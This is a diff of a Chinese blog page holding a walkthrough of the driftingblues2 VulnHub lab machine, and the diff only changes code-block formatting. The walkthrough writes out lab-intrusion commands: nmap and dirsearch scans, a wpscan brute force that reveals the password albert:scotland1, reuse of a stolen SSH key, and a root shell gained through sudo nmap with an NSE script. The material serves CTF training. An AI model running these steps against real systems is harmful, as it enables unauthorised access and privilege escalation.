@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集主机探测arp-scan -l   端口扫描nmap -sC -sV -p- 192.168.62.171   开放端口：21(ftp)、22(ssh)、80(http) 可以匿名访问ftp服务，有一张图片，应该有隐藏的信息    图片先放着，访问80端口没什么东西，扫一下目录 dirsearch -u http:&#x2F;&#x2F;192.168.62.171&#x2F;   有个blog的路径，是wordpre">
+    <meta name="description" content="信息收集主机探测1arp-scan -l   端口扫描1nmap -sC -sV -p- 192.168.62.171   开放端口：21(ftp)、22(ssh)、80(http) 可以匿名访问ftp服务，有一张图片，应该有隐藏的信息    图片先放着，访问80端口没什么东西，扫一下目录 1dirsearch -u http:&#x2F;&#x2F;192.168.62.171&#x2F;   有个blog的路径，是word">
 <meta property="og:type" content="article">
 <meta property="og:title" content="driftingblues2 VulnHub Walkthrough">
 <meta property="og:url" content="http://example.com/2021/10/12/driftingblues2-VulnHub-Walkthrough/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="信息收集主机探测arp-scan -l   端口扫描nmap -sC -sV -p- 192.168.62.171   开放端口：21(ftp)、22(ssh)、80(http) 可以匿名访问ftp服务，有一张图片，应该有隐藏的信息    图片先放着，访问80端口没什么东西，扫一下目录 dirsearch -u http:&#x2F;&#x2F;192.168.62.171&#x2F;   有个blog的路径，是wordpre">
+<meta property="og:description" content="信息收集主机探测1arp-scan -l   端口扫描1nmap -sC -sV -p- 192.168.62.171   开放端口：21(ftp)、22(ssh)、80(http) 可以匿名访问ftp服务，有一张图片，应该有隐藏的信息    图片先放着，访问80端口没什么东西，扫一下目录 1dirsearch -u http:&#x2F;&#x2F;192.168.62.171&#x2F;   有个blog的路径，是word">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png">
 <meta property="og:image" content="https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png">
@@ -181,11 +181,11 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><pre><code>arp-scan -l
-</code></pre>
+    <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png"></p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.171
-</code></pre>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.62.171</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png"></p>
 <p>开放端口：21(ftp)、22(ssh)、80(http)</p>
 <p>可以匿名访问ftp服务，有一张图片，应该有隐藏的信息</p>
@@ -193,19 +193,19 @@
 <img src="https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg" style="zoom: 25%;" />
 
 <p>图片先放着，访问80端口没什么东西，扫一下目录</p>
-<pre><code>dirsearch -u http://192.168.62.171/
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.62.171/</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png"></p>
 <p>有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下</p>
 <p><img src="https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png"></p>
 <p><img src="https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png"></p>
 <p>用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名</p>
-<pre><code>wpscan --url http://driftingblues.box/blog/ -e u
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://driftingblues.box/blog/ -e u</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png"></p>
 <p>再通过获取到的用户名albert，试试爆破密码</p>
-<pre><code>wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png"></p>
 <p>稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码<code>albert:scotland1</code>登录后台</p>
 <p><img src="https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png"></p>
@@ -217,25 +217,25 @@
 <p><img src="https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png"></p>
 <p><img src="https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png"></p>
 <p>靶机有python环境，可以获取一个交互式的shell</p>
-<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png"></p>
 <p>进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录</p>
 <p><img src="https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png"></p>
-<pre><code>ssh freddie@192.168.62.171 -i id_rsa
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh freddie@192.168.62.171 -i id_rsa</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png"></p>
 <p>得到第一个flag</p>
 <img src="https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png" style="zoom: 67%;" />
 
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png"></p>
 <p>可以看出来，接下来需要用nmap提权</p>
-<pre><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png"></p>
 <p>执行完获得root权限，但此时是看不到输入的，接着执行</p>
-<pre><code>reset
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure>
+
 <p>这时就可以获取第二个flag了</p>
 <img src="https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png" style="zoom:67%;" />
 
